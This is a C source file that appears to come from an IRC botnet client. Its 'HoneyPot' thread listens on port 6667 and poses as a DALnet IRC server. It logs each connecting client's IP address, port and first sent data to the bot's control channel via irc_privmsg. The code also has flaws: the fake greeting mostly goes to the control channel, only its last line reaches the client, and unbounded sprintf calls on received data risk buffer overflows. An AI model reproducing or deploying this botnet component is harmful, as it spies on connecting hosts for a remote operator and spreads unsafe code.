#include "includes.h"
#include "extern.h"


DWORD WINAPI IdentThread(LPVOID param)
{
	char user[12], buffer[BUFSIZ];
	
	BOOL success = FALSE;
	SOCKET ssock,csock;
	
	SOCKADDR_IN ssin, csin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = htons((unsigned short)6667);
	ssin.sin_addr.s_addr=INADDR_ANY;
	
	if ((ssock = socket(AF_INET, SOCK_STREAM, 0)) != INVALID_SOCKET) {
		if (bind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
			if (listen(ssock, 5) != SOCKET_ERROR) {
				int csin_len = sizeof(csin);
				
				while (1) {
					if ((csock = accept(ssock,(LPSOCKADDR)&csin,&csin_len)) == INVALID_SOCKET)
						break;
					
					sprintf(tstr, "Client connection from IP: %s:%d.", inet_ntoa(csin.sin_addr), csin.sin_port);
					if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);  
					if (recv(csock,tstr,sizeof(tstr),0) != SOCKET_ERROR) {
						Split(tstr,0);
						memset(user, 0, sizeof(user));
						recv(csock,buffer,sizeof(buffer),0);
						sprintf(tstr, "-HoneyPot.cpp- FakeIRCD: [%s].", buffer);
						if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE); 
						_snprintf(tstr,sizeof(tstr),":NOTICE AUTH :*** Looking up your hostname...\r\n");
						if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);  
						_snprintf(tstr,sizeof(tstr),":NOTICE AUTH :*** Found your hostname, cached\r\n");
						if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);  
						_snprintf(tstr,sizeof(tstr),":NOTICE AUTH :*** Checking Ident\r\n");
						if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);  
						_snprintf(tstr,sizeof(tstr),":001 RiMp :Welcome to the DALnet IRC Network\r\n");
						if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);  
						_snprintf(tstr,sizeof(tstr),":002 RiMp :Your host is swiftco.wa.us.dal.net\r\n");
						if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);  
						_snprintf(tstr,sizeof(tstr),":003 RiMp :This server was created Thu Dec 7 2006 at 16:29:38 PST\r\n");
						if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);  
						_snprintf(tstr,sizeof(tstr),":004 RiMp swiftco.wa.us.dal.net \r\n");
						if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);  
						_snprintf(tstr,sizeof(tstr),":005 RiMp NETWORK=DALnet\r\n");
						if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);  
						_snprintf(tstr,sizeof(tstr),":375 RiMp :- swiftco.wa.us.dal.net Message of the Day - \r\n");
						if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);  
						_snprintf(tstr,sizeof(tstr),":376 RiMp :End of /MOTD command.\r\n");
						
						if (send(csock,tstr,strlen(tstr),0) != SOCKET_ERROR)
							success = TRUE;
						
					}
				}
			}
		}
	}
	
	if (!success) {
		sprintf(tstr, "Error: server failed, returned: <%d>.", WSAGetLastError());
			if (!dl.silent) irc_privmsg(dl.sock, dl.chan, tstr, FALSE);  
	}
	closesocket(ssock);
	closesocket(csock);
	ExitThread(0);
	return 0;
}